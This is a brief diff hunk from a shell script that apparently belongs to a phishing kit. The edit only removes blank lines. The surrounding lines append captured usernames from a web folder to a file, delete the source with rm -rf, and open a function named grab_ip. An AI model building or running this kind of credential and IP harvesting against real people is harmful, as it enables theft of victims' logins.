@@ -243,8 +243,6 @@ cat pd/www/usernames.txt >> usernames.txt
 echo -e $red Press Ctrl + C $red TO EXIT
 rm -rf pd/www/usernames.txt
 fi
-
-
 }
 
 grab_ip() {
